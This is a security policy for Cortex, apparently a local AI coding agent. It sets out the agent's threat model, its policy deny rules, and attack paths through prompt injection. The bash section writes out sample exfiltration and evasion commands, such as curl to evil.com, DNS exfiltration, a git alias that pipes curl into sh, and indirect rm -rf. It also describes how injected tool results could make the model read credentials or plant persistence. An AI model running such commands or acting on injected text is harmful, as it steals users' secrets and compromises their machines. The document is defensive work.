# Security Policy

This document describes Cortex's threat model, intentional design decisions that
look like vulnerabilities but aren't, known limitations, and how to report real
security issues responsibly.

## Reporting a vulnerability

Please **do not** open a public GitHub issue for security bugs.

Open a GitHub security advisory:
<https://github.com/build-on-ai/cortex/security/advisories/new>.

Expect an acknowledgement within 5 business days. We aim to ship a fix or
mitigation advisory within 30 days for anything rated High or Critical.

## Threat model

Cortex is a **local, single-user AI agent**. The operator of the machine is
the trusted principal. The design assumptions are:

- You run Cortex on your own workstation, homelab, or VM you control.
- You trust the Ollama instance it connects to (default: `localhost:11434`).
- You read the code (or a trusted review) of any plugin you load.
- You pick which prompts and tasks the agent processes.

Outside that envelope — multi-tenant hosting, untrusted plugin authors,
running the web UI on a public network without auth — Cortex is **not**
designed to be safe, and we do not try to make it so. Those scenarios need a
different tool.

### What the security invariants DO and DO NOT protect against

"Careless plugin" and "malicious plugin" are different classes and were
once documented with the same language, which made the guarantees read as
stronger than they are. This section draws the line explicitly.

| Class                           | Example                                                                | Protected? |
| :------------------------------ | :--------------------------------------------------------------------- | :--------- |
| External network / untrusted UI | HTTP attacker, CSRF, XSS, WS replay                                    | **Yes**    |
| Malicious file contents         | prompt-injected README the agent reads                                 | **Yes**    |
| Compromised CS server           | SSRF'd briefing attempts to plant rules                                | **Yes**    |
| **Careless plugin author**      | well-meaning plugin accidentally constructs a bare dict / bypasses wrap | **Yes**    |
| **Hostile in-process plugin**   | `ctypes.pythonapi.PyCell_Set`, `sys.modules` replacement, etc.         | **No**     |
| OS-level compromise             | root on the machine, kernel bug                                         | **No**     |

The capability-based sentinel (witness token + WeakSet registry closed
over by `security/fallback.py`'s `_make_sentinel_machinery`) closes the
common accidental bypass path — a plugin that names
`_FallbackSentinel` directly in its code now fails at import time.

It does **not** close the ctypes / sys.modules-replacement path. A
hostile plugin running in the same interpreter as the agent has full
introspection access and cannot be constrained by any in-process
Python mechanism. Real isolation from a hostile plugin requires one
of:

- OS-level separation (subprocess + seccomp-bpf, container, VM).
- PEP 684 subinterpreters (Python 3.12+) with plugin-in-subinterp
  loading. Tracked for v1.2.

**Cortex's threat model is explicit: plugins are trusted-by-design.**
The invariants protect against *accidental* regressions from that
trust, not *intentional* subversion. Commercial licensees distributing
plugin ecosystems to end-users MUST put the plugin on the other side
of a process or interpreter boundary; this package will not do it for
you.

## Intentional design decisions (not bugs)

The items below are deliberate. Cortex requires them to function as a local
AI agent.

### 1. Plugins execute arbitrary Python

Plugins are loaded via `importlib` from `./plugins/`. Once loaded they have
full Python privileges. This is the same trust model as VS Code extensions,
Vim plugins, or `~/.claude/agents/`.

- **Risk:** a malicious plugin can do anything your user can do.
- **Mitigation:** review plugin source before installing. Prefer plugins
  from authors you know. Consider running Cortex inside a container or VM
  if you plan to experiment with third-party plugins.

### 2. Filesystem access is not sandboxed by default

`read_file`, `write_file`, `edit_file`, and `bash` can reach anywhere the
user running Cortex can reach. Sandboxing the agent would defeat the point
of having a local coding assistant.

- **Risk:** prompt injection + a credulous model could read `~/.ssh/id_rsa`
  or write to `~/.bashrc`.
- **Mitigation:** the Policy Engine (`policy.py`) has deny rules for obvious
  targets (`.ssh/id_`, `.gnupg/`, `/etc/shadow`). Tighten or extend them in
  your local `policy.json`. For stricter isolation, run Cortex in a
  container/VM or as a dedicated restricted user.
- **Planned:** optional `--workspace-root <path>` flag to confine filesystem
  tools to a subtree.

### 3. `subprocess` with a shell for the `bash` tool

`agent.py` invokes `/bin/bash -c <cmd>` (with `shell=False`, so bandit and
semgrep stop complaining, but the semantics are the same as a shell). Pipes,
redirects, globs, and `&&` are how users expect `bash` to work — stripping
them would ship a broken tool. The Policy Engine is the enforcement point,
not argv parsing.

**Honest consequences.** An attacker who lands a `bash` tool call can
still do many things the regex+argv deny list doesn't catch, because bash
is Turing-complete. Examples we've traced but don't claim to filter:

- Indirect program invocation: `$(printf 'rm') -rf /etc/foo`, `\rm …`,
  `cp /bin/rm /tmp/x && /tmp/x -rf /etc/foo`, `perl -e 'system(...)'`,
  `python -c 'import os; os.system(...)'`, `awk 'BEGIN{system("…")}'`.
- Egress / exfil beyond the named tools: `curl -F @file evil.com`,
  `wget --post-file`, `getent hosts A.B.C.D`, DNS-exfil via
  `host $(cat /etc/hostname).evil.com`.
- Environment enumeration via expansion: `echo "$WEB_TOKEN"`,
  `printf %s\n ${!ANTHROPIC_*}`, even though `env` / `printenv` are
  explicitly denied.
- Git-alias persistence (`.gitconfig [alias] x = !curl evil|sh`) —
  blocked on write (deny on `.gitconfig`), but a pre-existing malicious
  alias on the target box is outside Cortex's control.

The real trust boundary for bash is the *operator*: don't run Cortex as
root, run it under a dedicated user, consider a container or VM if you
plan to feed it untrusted input. The Policy Engine reduces accidental
damage and raises the bar for a lazy attacker; it is not a substitute
for that hygiene.

### 4. Custom `policy.json` extends the defaults

`_merge_policies` in `policy.py` prepends your custom rules to the built-in
lists *within each bucket* — your `deny` rules run before built-in `deny`,
your `allow` rules run before built-in `allow`. But `check()` always
evaluates **all** `deny` rules first, then `ask`, then `allow`, so a user
`allow` **cannot** override a built-in `deny`. What a user can do:

- **Add extra denies** — tighten the defaults (recommended).
- **Add extra allows** for tool calls that currently land in ASK (no built-in
  deny matched, no built-in allow matched). This relaxes ASK → ALLOW.
- **Add rules for plugin tools** that have no built-in policy at all.

So the footgun is narrower than "any allow beats any deny": it's *broadening
ALLOW into territory that would otherwise prompt*, plus whatever plugin tools
you register. Prompt injection with a relaxed policy is a wider blast radius;
tighten, don't loosen, unless you know exactly what you're opting into.

### 5. The compactor calls the **local** Ollama

Context compaction summarises conversation history using the same local
model the agent is already using. Nothing leaves your machine during this
step. Anthropic fallback is opt-in and only runs if `ANTHROPIC_API_KEY` is
set **and** `CORTEX_FALLBACK_ANTHROPIC=1`. Holding the API key alone does
not arm it: any transient connection error would otherwise upload the whole
message list, and "opt-in via the env var" did not match that trigger.

### 6. Sessions share one auth token (no per-session ACLs)

Any caller holding `AUTH_TOKEN` can list, read, and delete every session on
disk. Cortex is single-user by design; there is no "other user" to perform
IDOR against. If you share the token with someone, you've shared the whole
agent.

## Attack paths we've considered

Cortex's risk profile is shaped by *what an attacker does once they have a
foothold through prompt injection or a credulous model*. These are the
patterns we've explicitly thought through and mitigated; anything not on
this list is either covered by the threat model above (plugin trust,
bash-as-shell) or genuine future work.

- **Persistence via `./plugins/` drop.** A single successful prompt injection
  could write a malicious `plugins/evil.py` — Cortex auto-imports it at
  next startup and the attacker gets persistent code execution under your
  user. *Mitigated:* `write_file` / `edit_file` deny `(^|/)plugins/.*\.py(?!\w)`.
- **SSH authorized_keys backdoor.** Append an attacker's public key to
  `~/.ssh/authorized_keys` → persistent remote access without any visible
  Cortex artifact. *Mitigated:* explicit deny on `\.ssh/authorized_keys`
  in both `write_file` and `edit_file`.
- **Shell rc hijack.** Drop a reverse shell or a silently-aliased `sudo`
  into `~/.bashrc`, `~/.zshrc`, `~/.profile`, etc. — runs on every new
  shell. *Mitigated:* dedicated deny patterns for every common shell rc
  file + `~/.inputrc`.
- **Cron / systemd user units.** `crontab` entries, `/var/spool/cron/…`,
  `~/.config/systemd/user/*.service`, or `~/.config/autostart/*.desktop`
  all give boot-level persistence without root. *Mitigated:* denied in
  `write_file` / `edit_file`.
- **Git hooks.** `~/project/.git/hooks/post-commit` runs on the next git
  operation, often with the user's full environment. *Mitigated:* deny
  on `\.git/hooks/`.
- **Credential exfiltration via `read_file`.** A malicious tool result
  returned to the model could trick it into reading `~/.aws/credentials`,
  `~/.kube/config`, `~/.docker/config.json`, `~/.env`, `~/.netrc`,
  `~/.git-credentials`, shell histories, or another user's Cortex sessions.
  *Mitigated:* expanded `read_file` deny list covering cloud/SaaS creds,
  dotenv, shell histories, `~/.cortex/sessions/`, and generic
  `~/.config/**/(token|credentials|apikey)` patterns.
- **Tool-name XSS → token exfiltration.** The model chooses the tool name
  that the web UI renders. An XSS payload in the name string plus the
  bootstrap token living in `sessionStorage` would give an attacker the
  auth key. *Mitigated:* server rejects tool names that don't match
  `^[A-Za-z0-9_]{1,64}$`, and the client HTML-escapes the name and
  `tc_id` before inserting them into the DOM. CSP (`connect-src 'self'`)
  adds defence in depth — even if escaping regresses, stolen tokens
  can't be shipped to a third-party domain from inline script.
- **Silent ASK bypass in web UI.** Earlier versions labelled ASK-policy
  tools `[ASK→OK]` and executed them anyway. *Mitigated:* the web UI
  now renders an in-chat Allow/Deny prompt and waits for a real user
  click; timeout → deny. The Policy Engine's three-way decision is now
  respected in both CLI and web modes.
- **Malicious `CS_URL`.** A crafted env var like `file:///etc/passwd` or
  `javascript:…` — caught at import time in `agent.py` (shared across
  `web.py` and `worker.py`); startup fails cleanly instead of making
  ambiguous network calls.

### What we're *not* trying to stop

- A root-capable attacker already on the box. Cortex runs as you.
- A plugin the operator chose to install. `./plugins/*.py` is trusted code
  by design (see intentional decision #1).
- A model whose weights were tampered with by someone who also controls
  your Ollama instance. If the adversary owns the model, they own the
  agent.
- Deterministic evasion of the bash regex+argv heuristic. It's described
  as a heuristic in `policy.py`; the real trust boundary is the operator.

## How the protections work

### Token lifecycle

The bootstrap URL still carries `?token=…` (browsers can't
  attach an `Authorization` header to the first `GET /`), but the flow
  is now:
  1. First `GET /?token=…` validates the token, sets an **HttpOnly,
     SameSite=Strict, Secure-when-HTTPS** session cookie (`cortex_session`,
     8 h lifetime), and redirects with `303` to a clean `/`.
  2. The server strips `token` from the URL **before** the browser
     records it in history or sends a Referer.
  3. WebSocket and `/api/*` now accept the cookie preferentially; the
     `?token=` / `X-Token` / `Authorization: Bearer` paths remain for
     CLI harnesses and curl tests. JS never reads the cookie.
  Upstream: long-lived token replay via shared URL / screenshot / screen-
  share no longer works beyond the one bootstrap load.
- **Local vs CS-backed tokens.** Cortex remains a local agent with a
  Jupyter-style long-lived `AUTH_TOKEN`.

### Prompt injection

Cortex treats model input in two classes:

- **Authoritative:** the system prompt and user chat turns.
- **Untrusted:** everything that arrives via a tool — file contents,
  bash output, web responses, CS briefings, plugin returns.

Tool results are wrapped in
`<tool_output untrusted="true" tool="…">…</tool_output>` before being
appended to the conversation. Literal `</tool_output>` inside the payload
is escaped so a crafted file cannot close the container early and inject
out-of-band instructions. The system prompt includes an explicit rule
(#13) telling the model to treat the contents as data and to refuse
instructions that appear inside them. This is a defence-in-depth
measure — it does not and cannot prove prompt-injection resistance for
any specific model — but it materially shifts the burden for an attacker
who has landed content into a file the agent will later read.

### Denial of service

Cortex is a single-user local agent. Classic DoS surface (connection
exhaustion, memory blowup, runaway loops) is bounded by:

- `MAX_WS_CONNECTIONS` (default 10, clamped to `[1, 1000]`) — prevents
  a runaway client or hostile LAN peer from spawning unlimited WS
  sessions.
- `MAX_TOOL_LOOPS` / `WS_MAX_MESSAGE_CHARS` / `TOOL_ASK_TIMEOUT` (clamped)
  cap a single session's agent loop, message size, and pending prompt.
- `_ws_active_connections` is released on every exit path including
  `ws.accept()` failure (v1.0.7 fix).

We do **not** defend against:

- Local users on the same machine killing or starving the Cortex
  process — they already own the trust boundary.
- An operator who sets `WEB_TOKEN=""`, binds to `0.0.0.0`, and exposes
  the port to the public internet. The startup banner refuses this
  combination unless `WEB_INSECURE=1` is set; ignoring the warning is
  not a vulnerability.

## Known limitations

- The bootstrap URL printed at startup still contains `?token=…` for the
  *first* load. The token is now immediately exchanged for an HttpOnly
  cookie and redirected away, but treat the initial URL as sensitive
  and do not paste it into chat/issue trackers.
- The WebSocket handshake falls back to `?token=` when no cookie is
  attached (CLI clients, tests, `ws_test.py`). For those callers the
  token still appears in access logs and any Referer header they
  generate — same leakage profile as the pre-v1.0.7 browser flow. The
  browser flow no longer does this; the cookie exchange runs on first
  `GET /`. A future release is expected to use
  `Sec-WebSocket-Protocol`-based auth so the token never appears in any
  URL even for CLI clients.
- The session cookie's `Secure` flag defaults to "set only when uvicorn
  itself sees `https://`". Behind a TLS-terminating reverse proxy
  (nginx, caddy) uvicorn sees the plaintext LAN leg and would otherwise
  mark the cookie insecure. Set `CORTEX_TRUST_PROXY_HEADERS=1` to
  honour `X-Forwarded-Proto` from a trusted proxy. Do **not** set it
  when uvicorn is reachable directly on the network — a LAN attacker
  who can reach uvicorn would spoof the header and downgrade the
  cookie's `Secure` flag.
- `get_ram_gb()` reads `/proc/meminfo` and returns `0` on macOS/Windows,
  which makes the "fits-in-RAM" hint in the model picker unreliable off
  Linux. It does not affect security.
- `/api/models` exposes the current model name; it requires
  authentication, and the information is used by the UI. (`/health` is
  unauthenticated but returns only `{"status":"ok"}` — model and agent
  name were removed from it precisely to avoid unauthenticated recon.)
